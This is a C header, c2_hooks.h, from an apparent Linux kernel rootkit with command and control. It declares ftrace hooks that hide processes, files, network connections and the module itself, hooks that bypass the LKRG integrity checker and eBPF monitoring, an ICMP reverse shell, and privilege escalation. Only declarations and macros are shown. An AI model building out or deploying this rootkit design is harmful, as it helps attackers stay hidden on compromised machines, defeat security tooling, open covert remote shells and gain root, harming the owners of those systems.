#ifndef C2_HOOKS_H
#define C2_HOOKS_H

#include "c2_core.h"

/* ============================================
   FTRACE HOOK MACRO
   ============================================ */

#define HOOK(_name, _function, _original) \
    { .name = (_name), .function = (_function), .original = (_original) }

/* ============================================
   SYSCALL HOOKS (Process Hiding)
   ============================================ */

extern asmlinkage long (*original_getdents64)(const struct pt_regs *regs);
extern asmlinkage long (*original_getdents)(const struct pt_regs *regs);
extern asmlinkage long (*original_kill)(const struct pt_regs *regs);
extern asmlinkage long (*original_sysinfo)(const struct pt_regs *regs);
extern asmlinkage long (*original_openat)(const struct pt_regs *regs);
extern asmlinkage long (*original_statx)(const struct pt_regs *regs);

asmlinkage long fake_getdents64(const struct pt_regs *regs);
asmlinkage long fake_getdents(const struct pt_regs *regs);
asmlinkage long fake_kill(const struct pt_regs *regs);
asmlinkage long fake_sysinfo(const struct pt_regs *regs);
asmlinkage long fake_openat(const struct pt_regs *regs);
asmlinkage long fake_statx(const struct pt_regs *regs);

/* ============================================
   NETWORK HOOKS
   ============================================ */

extern asmlinkage long (*original_tcp4_seq_show)(const struct pt_regs *regs);
extern asmlinkage long (*original_tcp6_seq_show)(const struct pt_regs *regs);
extern asmlinkage long (*original_udp4_seq_show)(const struct pt_regs *regs);

asmlinkage long fake_tcp4_seq_show(const struct pt_regs *regs);
asmlinkage long fake_tcp6_seq_show(const struct pt_regs *regs);
asmlinkage long fake_udp4_seq_show(const struct pt_regs *regs);

/* ============================================
   MODULE HIDING
   ============================================ */

extern asmlinkage long (*original_seq_printf)(const struct pt_regs *regs);
asmlinkage long fake_seq_printf(const struct pt_regs *regs);

/* ============================================
   LKRG BYPASS
   ============================================ */

extern asmlinkage long (*original_p_cmp_creds)(const struct pt_regs *regs);
extern asmlinkage long (*original_p_cmp_tasks)(const struct pt_regs *regs);
extern asmlinkage long (*original_p_check_integrity)(const struct pt_regs *regs);
extern asmlinkage long (*original_p_dump_task_f)(const struct pt_regs *regs);

asmlinkage long fake_p_cmp_creds(const struct pt_regs *regs);
asmlinkage long fake_p_cmp_tasks(const struct pt_regs *regs);
asmlinkage long fake_p_check_integrity(const struct pt_regs *regs);
asmlinkage long fake_p_dump_task_f(const struct pt_regs *regs);

/* ============================================
   EBPF BYPASS
   ============================================ */

extern asmlinkage long (*original_bpf_prog_run)(const struct pt_regs *regs);
extern asmlinkage long (*original_perf_event_output)(const struct pt_regs *regs);

asmlinkage long fake_bpf_prog_run(const struct pt_regs *regs);
asmlinkage long fake_perf_event_output(const struct pt_regs *regs);

/* ============================================
   ICMP REVERSE SHELL
   ============================================ */

extern asmlinkage long (*original_icmp_rcv)(const struct pt_regs *regs);
asmlinkage long fake_icmp_rcv(const struct pt_regs *regs);

/* ============================================
   PRIVILEGE ESCALATION
   ============================================ */

asmlinkage long fake_kill_privilege(const struct pt_regs *regs);

/* ============================================
   HOOK ARRAYS
   ============================================ */

extern struct ftrace_hook process_hooks[];
extern struct ftrace_hook file_hooks[];
extern struct ftrace_hook network_hooks[];
extern struct ftrace_hook module_hooks[];
extern struct ftrace_hook lkrg_hooks[];
extern struct ftrace_hook ebpf_hooks[];
extern struct ftrace_hook icmp_hooks[];
extern struct ftrace_hook privilege_hooks[];

/* ============================================
   HOOK COUNT MACROS
   ============================================ */

#define PROCESS_HOOKS_COUNT (sizeof(process_hooks) / sizeof(struct ftrace_hook))
#define FILE_HOOKS_COUNT (sizeof(file_hooks) / sizeof(struct ftrace_hook))
#define NETWORK_HOOKS_COUNT (sizeof(network_hooks) / sizeof(struct ftrace_hook))
#define MODULE_HOOKS_COUNT (sizeof(module_hooks) / sizeof(struct ftrace_hook))
#define LKRG_HOOKS_COUNT (sizeof(lkrg_hooks) / sizeof(struct ftrace_hook))
#define EBPF_HOOKS_COUNT (sizeof(ebpf_hooks) / sizeof(struct ftrace_hook))
#define ICMP_HOOKS_COUNT (sizeof(icmp_hooks) / sizeof(struct ftrace_hook))
#define PRIVILEGE_HOOKS_COUNT (sizeof(privilege_hooks) / sizeof(struct ftrace_hook))

#endif /* C2_HOOKS_H */
